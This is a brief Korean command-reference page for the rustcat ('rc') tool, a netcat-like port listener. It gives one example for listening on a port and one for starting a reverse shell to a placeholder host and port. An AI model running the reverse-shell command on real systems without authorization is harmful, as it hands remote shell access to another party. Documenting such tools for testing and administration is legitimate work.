<h1>rc</h1>

<blockquote><p>현대적이고 단순한 포트 리스너 및 리버스 셸.
<code>nc</code>와 유사.
더 많은 정보: <a href="https://github.com/robiot/rustcat/wiki/Basic-Usage">https://github.com/robiot/rustcat/wiki/Basic-Usage</a>.</p></blockquote>

<ul>
<li>특정 포트에서 리스닝 시작:</li>
</ul>


<p><code>rc -lp {{포트}}</code></p>

<ul>
<li>리버스 셸 시작:</li>
</ul>


<p><code>rc {{호스트}} {{포트}} -r {{셸}}</code></p>
